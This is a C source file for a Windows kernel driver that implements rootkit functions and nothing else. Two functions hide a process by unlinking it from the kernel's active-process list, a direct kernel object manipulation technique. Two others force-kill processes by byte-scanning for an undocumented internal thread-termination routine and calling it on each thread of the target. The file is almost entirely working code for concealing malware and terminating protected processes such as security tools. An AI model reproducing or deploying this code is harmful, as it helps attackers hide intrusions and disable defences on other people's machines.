#include "process.h"


PVOID SearchMemory(PVOID pStartAddress, PVOID pEndAddress, PUCHAR pMemoryData, ULONG ulMemoryDataSize)
{
	PVOID pAddress = NULL;
	PUCHAR i = NULL;
	ULONG m = 0;

	for (i = (PUCHAR)pStartAddress; i < (PUCHAR)pEndAddress; i++)
	{
		for (m = 0; m < ulMemoryDataSize; m++)
		{
			if (*(PUCHAR)(i + m) != pMemoryData[m])
				break;
		}

		if (m >= ulMemoryDataSize)
		{
			pAddress = (PVOID)(i + ulMemoryDataSize);
			break;
		}
	}

	return pAddress;
}

PVOID SearchPspTerminateThreadByPointer(PUCHAR pSpecialData, ULONG ulSpecialDataSize)
{
	UNICODE_STRING ustrFuncName;
	PVOID pAddress = NULL;
	LONG lOffset = 0;
	PVOID pPsTerminateSystemThread = NULL;
	PVOID pPspTerminateThreadByPointer = NULL;

	RtlInitUnicodeString(&ustrFuncName, L"PsTerminateSystemThread");

	pPsTerminateSystemThread = MmGetSystemRoutineAddress(&ustrFuncName);
	if (!pPsTerminateSystemThread)
		return NULL;

	pAddress = SearchMemory(pPsTerminateSystemThread, (PVOID)((PUCHAR)pPsTerminateSystemThread + 0xFF), pSpecialData, ulSpecialDataSize);
	if (!pAddress)
		return NULL;

	lOffset = *(PLONG)pAddress;
	pPspTerminateThreadByPointer = (PVOID)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

	return pPspTerminateThreadByPointer;
}

PVOID GetPspLoadImageNotifyRoutine()
{
	PVOID pPspTerminateThreadByPointerAddress = NULL;
	RTL_OSVERSIONINFOW ver = { 0 };
	UCHAR pSpecialData[50] = { 0 };

	RtlGetVersion(&ver);

	switch (ver.dwMajorVersion)
	{
	case 6:
		switch (ver.dwMinorVersion)
		{
		case 1:
			pSpecialData[0] = 0xE8;
			break;
		case 2:
			break;
		case 3:
			pSpecialData[0] = 0xE9;
			break;
		default:
			break;
		}
		break;
	case 10:
		if (ver.dwBuildNumber >= 17134)
			pSpecialData[0] = 0xE8;
		else
			pSpecialData[0] = 0xE9;
		break;
	default:
		break;
	}

	pPspTerminateThreadByPointerAddress = SearchPspTerminateThreadByPointer(pSpecialData, 1);
	return pPspTerminateThreadByPointerAddress;
}

ULONG GetActiveProcessLinksOffset()
{
	ULONG ulOffset = 0;
	RTL_OSVERSIONINFOW ver = { 0 };

	RtlGetVersion(&ver);

	switch (ver.dwMajorVersion)
	{
	case 6:
		switch (ver.dwMinorVersion)
		{
		case 1:
			ulOffset = 0x188;
			break;
		case 2:
			break;
		case 3:
			ulOffset = 0x2E8;
			break;
		default:
			break;
		}
		break;
	case 10:
		if (ver.dwBuildNumber < 19041)
			ulOffset = 0x2F0;
		else
			ulOffset = 0x448;
		break;
	default:
		break;
	}

	return ulOffset;
}

BOOL process_hide(HANDLE hHideProcessId)
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;

	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
		return FALSE;

	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	do
	{
		hProcessId = PsGetProcessId(pEProcess);
		if (hProcessId == hHideProcessId)
		{
			RemoveEntryList((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset));
			break;
		}

		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);
	} while (pFirstEProcess != pEProcess);

	return TRUE;
}

BOOL process_hide2(PUCHAR pszHideProcessName)
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	PUCHAR pszProcessName = NULL;

	ulOffset = GetActiveProcessLinksOffset();
	if (!ulOffset)
		return FALSE;

	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	do
	{
		pszProcessName = PsGetProcessImageFileName(pEProcess);

		if (!_stricmp(pszProcessName, pszHideProcessName))
		{
			RemoveEntryList((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset));
		}

		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);
	} while (pFirstEProcess != pEProcess);

	return TRUE;
}

BOOL process_kill(HANDLE hProcessId)
{
	PVOID pPspTerminateThreadByPointerAddress = NULL;
	PEPROCESS pEProcess = NULL;
	PETHREAD pEThread = NULL;
	PEPROCESS pThreadEProcess = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG i = 0;

	typedef NTSTATUS(__fastcall* PSPTERMINATETHREADBYPOINTER) (PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate);

	pPspTerminateThreadByPointerAddress = GetPspLoadImageNotifyRoutine();
	if (NULL == pPspTerminateThreadByPointerAddress)
		return FALSE;

	status = PsLookupProcessByProcessId(hProcessId, &pEProcess);
	if (!NT_SUCCESS(status))
		return FALSE;

	for (i = 4; i < 0x80000; i = i + 4)
	{
		status = PsLookupThreadByThreadId((HANDLE)i, &pEThread);
		if (NT_SUCCESS(status))
		{
			pThreadEProcess = PsGetThreadProcess(pEThread);
			if (pEProcess == pThreadEProcess)
			{
				((PSPTERMINATETHREADBYPOINTER)pPspTerminateThreadByPointerAddress)(pEThread, 0, 1);
			}
			ObDereferenceObject(pEThread);
		}
	}

	ObDereferenceObject(pEProcess);
	return TRUE;
}

BOOL process_kill2(PUCHAR pszKillProcessName)
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;
	PUCHAR pszProcessName = NULL;

	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
		return FALSE;

	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	do
	{
		hProcessId = PsGetProcessId(pEProcess);
		pszProcessName = PsGetProcessImageFileName(pEProcess);

		if (!_stricmp(pszProcessName, pszKillProcessName))
		{
			process_kill(hProcessId);
		}

		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);
	} while (pFirstEProcess != pEProcess);

	return TRUE;
}